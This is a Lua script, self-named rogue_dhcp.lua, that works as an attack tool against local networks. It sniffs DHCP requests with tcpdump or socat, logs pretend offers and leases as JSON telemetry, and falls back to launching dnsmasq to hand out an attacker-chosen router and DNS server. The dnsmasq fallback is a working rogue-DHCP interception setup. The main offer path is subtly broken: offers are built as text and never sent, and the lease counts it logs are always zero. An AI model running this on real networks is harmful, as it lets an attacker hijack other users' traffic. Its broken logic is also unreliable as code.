local iface = arg[1]
local subnet = arg[2] or "10.0.0.0"
local router_ip = arg[3] or "10.0.0.1"
local dns_ip = arg[4] or "8.8.8.8"
local domain = arg[5] or "localnet"
local start_ip = arg[6] or "10.0.0.100"
local end_ip = arg[7] or "10.0.0.200"

local leases = {}
local offer_pool = {}
local next_offer = nil

local function ip_to_num(ip)
  local a, b, c, d = ip:match("(%d+)%.(%d+)%.(%d+)%.(%d+)")
  if not a then return nil end
  return tonumber(a) * 16777216 + tonumber(b) * 65536 + tonumber(c) * 256 + tonumber(d)
end

local function num_to_ip(n)
  return string.format("%d.%d.%d.%d",
    (n >> 24) & 0xff, (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff)
end

local function build_ip_range()
  local start_num = ip_to_num(start_ip)
  local end_num = ip_to_num(end_ip)
  if not start_num or not end_num then
    start_num = ip_to_num("10.0.0.100")
    end_num = ip_to_num("10.0.0.200")
  end
  for i = start_num, end_num do
    offer_pool[#offer_pool + 1] = num_to_ip(i)
  end
end

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":"","ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function get_free_ip()
  for _, ip in ipairs(offer_pool) do
    local taken = false
    for _, lease in pairs(leases) do
      if lease.ip == ip then taken = true break end
    end
    if not taken then return ip end
  end
  return nil
end

local function build_dhcp_offer(client_mac, offered_ip, xid)
  -- Minimal DHCP Offer via UDP using raw socket approach
  local chaddr = {}
  for b in client_mac:gmatch("(%x%x)") do
    chaddr[#chaddr + 1] = tonumber(b, 16)
  end
  while #chaddr < 16 do chaddr[#chaddr + 1] = 0 end

  local secs = 0
  local flags = 0x8000
  local ciaddr = {0, 0, 0, 0}
  local yiaddr_parts = {}
  for b in offered_ip:gmatch("(%d+)") do
    yiaddr_parts[#yiaddr_parts + 1] = tonumber(b)
  end
  local siaddr_parts = {}
  for b in router_ip:gmatch("(%d+)") do
    siaddr_parts[#siaddr_parts + 1] = tonumber(b)
  end

  -- DHCP fields (simplified for injection via text)
  local offer_str = "OFFER xid=" .. tostring(xid) .. " yiaddr=" .. offered_ip .. " siaddr=" .. router_ip .. " client=" .. client_mac
  return offer_str
end

local function send_dhcp_offer(client_mac, offered_ip, xid)
  telemetry("dhcp_offer", '{"client":' .. json_escape(client_mac) .. ',"offered_ip":' .. json_escape(offered_ip) .. ',"xid":' .. json_escape(tostring(xid)) .. ',"router":' .. json_escape(router_ip) .. ',"dns":' .. json_escape(dns_ip) .. ',"domain":' .. json_escape(domain) .. '}')
  leases[client_mac] = {
    ip = offered_ip,
    xid = xid,
    lease_time = os.time() + 3600,
    state = "offered"
  }
  telemetry("lease_add", '{"client":' .. json_escape(client_mac) .. ',"ip":' .. json_escape(offered_ip) .. ',"lease_time":3600}')
end

local function send_dhcp_ack(client_mac, offered_ip, xid)
  telemetry("dhcp_ack", '{"client":' .. json_escape(client_mac) .. ',"ip":' .. json_escape(offered_ip) .. ',"xid":' .. json_escape(tostring(xid)) .. '}')
  if leases[client_mac] then
    leases[client_mac].state = "active"
    leases[client_mac].ack_time = os.time()
  end
end

local function parse_dhcp_discover(line)
  local client_mac = line:match("([%x:]+)")
  local xid = line:match("xid[=:]?(0x[%x]+)")
  local dst_ip = line:match("(%d+%.%d+%.%d+%.%d+)")
  if not client_mac or not client_mac:match("^%x%x:%x%x:%x%x:%x%x:%x%x:%x%x$") then
    return nil
  end
  local rand_xid = math.random(100000, 999999)
  return client_mac, rand_xid
end

local function listen_for_dhcp()
  local cmd = "tcpdump -l -i " .. iface .. " -s 256 -e -n port 67 or port 68 2>/dev/null"
  local f = io.popen(cmd)
  if not f then
    telemetry("error", '{"error":"tcpdump not available, trying socat"}')
    local cmd2 = "socat UDP-LISTEN:67,fork,reuseaddr - 2>/dev/null"
    f = io.popen(cmd2)
    if not f then
      telemetry("error", '{"error":"No packet capture tool available"}')
      return nil
    end
    telemetry("capture_mode", '{"method":"socat"}')
    return f, "socat"
  end
  telemetry("capture_mode", '{"method":"tcpdump"}')
  return f, "tcpdump"
end

local function process_dhcp_traffic()
  build_ip_range()
  telemetry("server_start", '{"iface":' .. json_escape(iface) .. ',"subnet":' .. json_escape(subnet) .. ',"router":' .. json_escape(router_ip) .. ',"dns":' .. json_escape(dns_ip) .. ',"pool_start":' .. json_escape(start_ip) .. ',"pool_end":' .. json_escape(end_ip) .. '}')

  local sniffer, method = listen_for_dhcp()
  if not sniffer then
    telemetry("error", '{"error":"Cannot start DHCP listener, trying dnsmasq fallback"}')
    local cmd = "dnsmasq --interface=" .. iface .. " --dhcp-range=" .. start_ip .. "," .. end_ip .. ",255.255.255.0,1h --dhcp-option=3," .. router_ip .. " --dhcp-option=6," .. dns_ip .. " --no-daemon 2>/dev/null &"
    os.execute(cmd)
    telemetry("dnsmasq", '{"cmd":' .. json_escape(cmd) .. '}')
    os.execute("sleep 10")
    os.execute("killall dnsmasq 2>/dev/null")
    return
  end

  local start_time = os.time()
  local packet_count = 0

  while os.time() - start_time < 300 do
    local line = sniffer:read("*l")
    if not line then break end
    packet_count = packet_count + 1

    telemetry("dhcp_packet", '{"raw":' .. json_escape(line:sub(1, 200)) .. ',"packet_num":' .. tostring(packet_count) .. '}')

    local is_discover = line:find("DISCOVER") or line:find("discover") or line:find("0x01")
    local is_request = line:find("REQUEST") or line:find("request") or (line:find("0x03") and not line:find("0x01"))

    if is_discover then
      local client_mac, xid = parse_dhcp_discover(line)
      if client_mac then
        local offered = get_free_ip()
        if offered then
          send_dhcp_offer(client_mac, offered, xid or math.random(100000, 999999))
        else
          telemetry("pool_exhausted", '{"client":' .. json_escape(client_mac) .. '}')
        end
      end
    elseif is_request then
      local client_mac, xid = parse_dhcp_discover(line)
      if client_mac then
        local ip = nil
        if leases[client_mac] then
          ip = leases[client_mac].ip
        else
          ip = get_free_ip()
        end
        if ip then
          send_dhcp_ack(client_mac, ip, xid or math.random(100000, 999999))
        end
      end
    end

    if packet_count % 10 == 0 then
      telemetry("status", '{"packets":' .. tostring(packet_count) .. ',"leases":' .. tostring(#leases) .. '}')
    end
  end
  sniffer:close()
  telemetry("server_stop", '{"packets_processed":' .. tostring(packet_count) .. ',"total_leases":' .. tostring(#leases) .. '}')
end

if not iface then
  telemetry("error", '{"error":"Usage: rogue_dhcp.lua <iface> [subnet] [router_ip] [dns_ip] [domain] [start_ip] [end_ip]"}')
  os.exit(1)
end

local ok, err = pcall(process_dhcp_traffic)
if not ok then
  telemetry("error", '{"error":"DHCP server failed: ' .. json_escape(tostring(err)) .. '"}')
end

for mac, lease in pairs(leases) do
  telemetry("lease_final", '{"client":' .. json_escape(mac) .. ',"ip":' .. json_escape(lease.ip) .. ',"state":' .. json_escape(lease.state) .. '}')
end
telemetry("complete", '{"iface":' .. json_escape(iface) .. '}')
